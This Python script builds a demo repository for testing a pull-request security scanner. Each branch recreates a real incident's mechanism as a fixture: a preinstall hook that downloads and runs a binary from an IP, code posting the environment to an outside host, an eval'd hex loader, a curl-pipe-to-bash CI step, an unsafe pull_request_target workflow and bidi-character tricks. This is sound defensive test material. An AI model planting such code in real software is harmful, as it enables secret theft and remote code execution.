"""Build "prscreen-incidents": a small app where every branch recreates one real incident.

    uv run python scripts/incidents_repo.py build ../prscreen-incidents
    uv run python scripts/incidents_repo.py check ../prscreen-incidents

``main`` is a small, ordinary web shop (Flask backend, Node build tooling, GitHub workflows).
Each ``incident/<id>`` branch is one commit that recreates the key mechanism of a documented
real-world incident in this app; the commit message and the repository README carry the
incident's summary and sources, which come from ``prscreen.gui.samples`` so there is one place
to maintain them. ``control/ordinary-change`` is a normal feature on which prscreen stays quiet.

Scan a branch with the GUI (Git repository mode) or with
``prscreen scan --repo ../prscreen-incidents --git main...incident/codecov-2021``.

Every payload is inert, fake credentials are assembled at run time, and nothing in the
repository is meant to be run.
"""

from __future__ import annotations

import argparse
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from prscreen.diff import parse_diff  # noqa: E402
from prscreen.engine import ScanResult, scan  # noqa: E402
from prscreen.gitdiff import git_diff  # noqa: E402
from prscreen.gui.samples import SAMPLES  # noqa: E402
from prscreen.models import Severity  # noqa: E402

DEFAULT_ACTION = "sreevar2005/pr_Sentinel_final@4a78297e10a9178673bbc63c8b6352006fbb5099"
CHECKOUT = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
RLO, LRI, PDI = chr(0x202E), chr(0x2066), chr(0x2069)
FAKE_KEY = "tc-" + "7Qm2xZ9p" + "Lk4vW8rN" + "3sJd"
INERT_HEX = (
    b"// stand-in for the encrypted flatmap-stream payload: harmless text, decoded and run the same way. "
    b"The real one decrypted with the package description as the key and targeted a bitcoin wallet app."
).hex()
INCIDENTS = {sample["id"]: sample for sample in SAMPLES}


def base_files(action: str) -> dict[str, str]:
    return {
        "README.md": "",  # written by build() once the branches are known
        "requirements.txt": "flask==3.0.3\nrequests==2.32.3\nnumpy==1.26.4\n",
        "app/__init__.py": "from flask import Flask\n\napp = Flask(__name__)\n",
        "app/config.py": (
            "import os\n\n"
            'DATA_SERVER_HOST = os.environ.get("DATA_SERVER_HOST", "db.internal")\n'
            'DATA_SERVER_ACCESS_KEY = os.environ["DATA_SERVER_ACCESS_KEY"]\n'
        ),
        "app/auth.py": (
            'def is_admin(user) -> bool:\n    return user is not None and user.role == "admin"\n'
        ),
        "app/views.py": (
            "from flask import jsonify\n\nfrom app import app\n\nPRODUCTS: list[dict] = []\n\n\n"
            '@app.get("/products")\n'
            "def products():\n"
            "    return jsonify(PRODUCTS)\n"
        ),
        "web/package.json": (
            "{\n"
            '  "name": "acme-store-web",\n'
            '  "version": "1.0.0",\n'
            '  "scripts": {\n'
            '    "build": "node build.js",\n'
            '    "test": "node --test"\n'
            "  },\n"
            '  "dependencies": {\n'
            '    "duplexer": "~0.1.1",\n'
            '    "express": "^4.21.1"\n'
            "  },\n"
            '  "devDependencies": {\n'
            '    "cross-env": "^7.0.3"\n'
            "  }\n"
            "}\n"
        ),
        "web/build.js": "console.log('building assets');\n",
        ".github/workflows/ci.yml": (
            "name: CI\n"
            "on:\n"
            "  pull_request:\n"
            "permissions:\n"
            "  contents: read\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-24.04\n"
            "    steps:\n"
            f"      - uses: {CHECKOUT}\n"
            "        with:\n"
            "          persist-credentials: false\n"
            "      - run: pip install -r requirements.txt pytest pytest-cov\n"
            "      - run: pytest --cov\n"
        ),
        ".github/workflows/format.yml": (
            "name: format\n"
            "on:\n"
            "  pull_request:\n"
            "permissions:\n"
            "  contents: read\n"
            "jobs:\n"
            "  format:\n"
            "    runs-on: ubuntu-24.04\n"
            "    steps:\n"
            f"      - uses: {CHECKOUT}\n"
            "        with:\n"
            "          persist-credentials: false\n"
            "      - run: pip install ruff && ruff format --check .\n"
        ),
        ".github/workflows/prscreen.yml": (
            "name: prscreen\n"
            "on:\n"
            "  pull_request:\n"
            "permissions:\n"
            "  contents: read\n"
            "jobs:\n"
            "  screen:\n"
            "    runs-on: ubuntu-24.04\n"
            "    timeout-minutes: 10\n"
            "    steps:\n"
            f"      - uses: {CHECKOUT}\n"
            "        with:\n"
            "          fetch-depth: 0\n"
            "          persist-credentials: false\n"
            f"      - uses: {action}\n"
        ),
    }


@dataclass
class Branch:
    name: str
    incident: str | None
    """Key into prscreen.gui.samples.SAMPLES; None for the control branch."""
    title: str
    change: dict[str, tuple[str, str] | str]
    """path -> (old text, new text) replaced in the base file, or the full text of a new file."""
    expect: set[str] = field(default_factory=set)
    """Rule IDs that must appear. Empty: nothing at medium or above may appear."""


BRANCHES = [
    Branch(
        "control/ordinary-change",
        None,
        "Add pagination to the product list",
        {
            "app/views.py": ("from flask import jsonify\n", "from flask import jsonify, request\n"),
            "app/views.py#2": (
                "    return jsonify(PRODUCTS)\n",
                '    page = max(int(request.args.get("page", 1)), 1)\n'
                "    return jsonify(PRODUCTS[(page - 1) * 20 : page * 20])\n",
            ),
        },
    ),
    Branch(
        "incident/toyota-2022",
        "toyota-2022",
        "Hardcode the data server key so the app starts without setup",
        {"app/config.py": ('os.environ["DATA_SERVER_ACCESS_KEY"]', f'"{FAKE_KEY}"')},
        {"SEC003"},
    ),
    Branch(
        "incident/event-stream-2018",
        "event-stream-2018",
        "Add flatmap-stream for the stream pipeline",
        {
            "web/package.json": (
                '    "duplexer": "~0.1.1",\n',
                '    "duplexer": "~0.1.1",\n    "flatmap-stream": "0.1.1",\n',
            ),
            "web/lib/flatmap.js": (
                "module.exports = function flatMap(mapper) { return mapper; };\n"
                f"var n = '{INERT_HEX}';\n"
                "!function () { try { new Function(Buffer.from(n, 'hex').toString())(); } catch (e) {} }();\n"
            ),
        },
        {"DEP001", "OBF004", "OBF005"},
    ),
    Branch(
        "incident/ua-parser-js-2021",
        "ua-parser-js-2021",
        "Prepare native helpers before install",
        {
            "web/package.json": (
                '  "scripts": {\n',
                '  "scripts": {\n    "preinstall": "start /B node preinstall.js & node preinstall.js",\n',
            ),
            "web/preinstall.js": (
                "const { exec } = require('child_process');\n"
                "exec(`curl http://159.148.186.228/download/jsextension -o jsextension && ./jsextension &`);\n"
            ),
        },
        {"EXE005", "EXE003", "NET001"},
    ),
    Branch(
        "incident/crossenv-2017",
        "crossenv-2017",
        "Update the cross-env dev dependency",
        {"web/package.json": ('    "cross-env": "^7.0.3"\n', '    "crossenv": "^6.1.1"\n')},
        {"DEP002"},
    ),
    Branch(
        "incident/ctx-2022",
        "ctx-2022",
        "Add startup telemetry",
        {
            "app/telemetry.py": (
                "import base64\nimport os\n\nimport requests\n\n\n"
                "def report_startup():\n"
                "    payload = base64.b64encode(str(os.environ).encode()).decode()\n"
                '    requests.post("https://metrics-collector-demo.herokuapp.com/ingest", data=payload, timeout=5)\n'
            ),
        },
        {"NET004", "NET003"},
    ),
    Branch(
        "incident/codecov-2021",
        "codecov-2021",
        "Upload coverage to Codecov",
        {
            ".github/workflows/ci.yml": (
                "      - run: pytest --cov\n",
                "      - run: pytest --cov\n      - run: bash <(curl -s https://codecov.io/bash)\n",
            )
        },
        {"EXE001"},
    ),
    Branch(
        "incident/pytorch-2022",
        "pytorch-2022",
        "Try the PyTorch nightly build",
        {
            "requirements.txt": (
                "numpy==1.26.4\n",
                "--extra-index-url https://download.pytorch.org/whl/nightly/cpu\nnumpy==1.26.4\ntorch\n",
            )
        },
        {"DEP003"},
    ),
    Branch(
        "incident/ultralytics-2024",
        "ultralytics-2024",
        "Auto-format pull requests from forks",
        {
            ".github/workflows/format.yml": (
                "  pull_request:\n",
                "  pull_request_target:\n",
            ),
            ".github/workflows/format.yml#2": (
                "      - run: pip install ruff && ruff format --check .\n",
                '      - run: git checkout "${{ github.head_ref }}" && pip install ruff && ruff format .\n',
            ),
        },
        {"CI001", "CI003"},
    ),
    Branch(
        "incident/tj-actions-2025",
        "tj-actions-2025",
        "Only run tests for changed files",
        {
            ".github/workflows/ci.yml": (
                "      - run: pip install -r requirements.txt pytest pytest-cov\n",
                "      - id: changed\n        uses: tj-actions/changed-files@v45\n"
                "      - run: pip install -r requirements.txt pytest pytest-cov\n",
            ),
        },
        {"CI005"},
    ),
    Branch(
        "incident/trojan-source-2021",
        "trojan-source-2021",
        "Tidy the admin check",
        {"app/auth.py": ('user.role == "admin"', f'user.role != "user{RLO} {LRI}# admin only{PDI} {LRI}"')},
        {"OBF001"},
    ),
]


def _git(repo: Path, *args: str) -> str:
    proc = subprocess.run(["git", *args], cwd=repo, check=True, capture_output=True, text=True)
    return proc.stdout.strip()


def _write(repo: Path, files: dict[str, str]) -> None:
    for rel, content in files.items():
        path = repo / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8", newline="\n")


def _apply(repo: Path, branch: Branch) -> None:
    for key, change in branch.change.items():
        rel = key.split("#", 1)[0]
        path = repo / rel
        if isinstance(change, str):
            _write(repo, {rel: change})
            continue
        old, new = change
        text = path.read_text(encoding="utf-8")
        if old not in text:
            raise ValueError(f"{branch.name}: {rel} does not contain {old!r}")
        path.write_text(text.replace(old, new, 1), encoding="utf-8", newline="\n")


def _commit_message(branch: Branch) -> str:
    if branch.incident is None:
        return (
            f"{branch.title}\n\nControl branch: an ordinary change. prscreen should report nothing above low."
        )
    incident = INCIDENTS[branch.incident]
    sources = "\n".join(f"- {s['name']}: {s['url']}" for s in incident["sources"])
    return (
        f"{branch.title}\n\n"
        f"Recreates: {incident['title']} ({incident['year']})\n\n{incident['summary']}\n\n"
        f"Sources:\n{sources}\n\nEvery payload in this repository is inert. Do not merge."
    )


def readme() -> str:
    rows = []
    for branch in BRANCHES:
        if branch.incident is None:
            rows.append(f"| `{branch.name}` | Control: an ordinary change, should stay quiet | | |")
            continue
        incident = INCIDENTS[branch.incident]
        links = ", ".join(f"[{s['name']}]({s['url']})" for s in incident["sources"])
        rows.append(f"| `{branch.name}` | {incident['title']} | {incident['year']} | {links} |")
    return (
        "# prscreen-incidents\n\n"
        "A small web shop where every `incident/...` branch recreates one **real, documented** security\n"
        "incident, for trying [prscreen](https://github.com/sreevar2005/pr_Sentinel_final). Each branch is one\n"
        "commit on top of `main`; its commit message explains the incident and links the sources.\n\n"
        "**Nothing here is meant to be run.** Every payload is an inert stand-in, credentials are fake,\n"
        "and the code recreates only each incident's key mechanism, not the attackers' code.\n\n"
        "## Scan it\n\n"
        "```bash\n"
        "git clone https://github.com/sreevar2005/prscreen-incidents\n"
        "```\n\n"
        "Then in the prscreen GUI choose **Git repository**, enter the folder, press **Load branches** and\n"
        "pick a branch. Or from the command line:\n\n"
        "```bash\n"
        "prscreen scan --repo prscreen-incidents --git main...incident/codecov-2021\n"
        "```\n\n"
        "## Branches\n\n"
        "| Branch | Incident | Year | Sources |\n| --- | --- | --- | --- |\n" + "\n".join(rows) + "\n"
    )


def build(target: Path, action: str) -> None:
    if target.exists() and any(target.iterdir()):
        raise SystemExit(f"{target} exists and is not empty")
    target.mkdir(parents=True, exist_ok=True)
    _git(target, "init", "-q", "-b", "main")
    _git(target, "config", "user.name", "prscreen incidents")
    _git(target, "config", "user.email", "incidents@example.invalid")
    _git(target, "config", "core.autocrlf", "false")
    _write(target, {**base_files(action), "README.md": readme()})
    _git(target, "add", "-A")
    _git(target, "commit", "-qm", "acme-store: base app with prscreen enabled")
    for branch in BRANCHES:
        _git(target, "checkout", "-q", "-b", branch.name, "main")
        _apply(target, branch)
        _git(target, "add", "-A")
        _git(target, "commit", "-qm", _commit_message(branch))
    _git(target, "checkout", "-q", "main")


def scan_branches(repo: Path) -> dict[str, ScanResult]:
    return {
        b.name: scan(parse_diff(git_diff(f"main...{b.name}", repo).decode("utf-8", errors="replace")))
        for b in BRANCHES
    }


def check(results: dict[str, ScanResult]) -> list[str]:
    problems = []
    for branch in BRANCHES:
        found = {f.rule.id for f in results[branch.name].findings}
        loud = {f.rule.id for f in results[branch.name].findings if f.severity >= Severity.MEDIUM}
        if branch.expect and not branch.expect <= found:
            problems.append(f"{branch.name}: missing {sorted(branch.expect - found)}")
        if not branch.expect and loud:
            problems.append(f"{branch.name}: should be quiet but found {sorted(loud)}")
    return problems


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    commands = parser.add_subparsers(dest="command", required=True)
    build_cmd = commands.add_parser("build", help="create the repository at PATH")
    build_cmd.add_argument("path", type=Path)
    build_cmd.add_argument(
        "--action", default=DEFAULT_ACTION, help="prscreen action reference, pinned to a commit"
    )
    check_cmd = commands.add_parser("check", help="scan every branch of an existing build and compare")
    check_cmd.add_argument("path", type=Path)
    args = parser.parse_args(argv)
    if args.command == "build":
        build(args.path, args.action)
        print(f"Built {args.path}: main plus {len(BRANCHES)} branches")
        return 0
    results = scan_branches(args.path)
    for branch in BRANCHES:
        result = results[branch.name]
        rules = ", ".join(sorted({f"{f.rule.id} ({f.severity.label})" for f in result.findings})) or "nothing"
        print(f"{branch.name:34} {rules}")
    problems = check(results)
    for problem in problems:
        print("PROBLEM", problem)
    return 1 if problems else 0


if __name__ == "__main__":
    raise SystemExit(main())
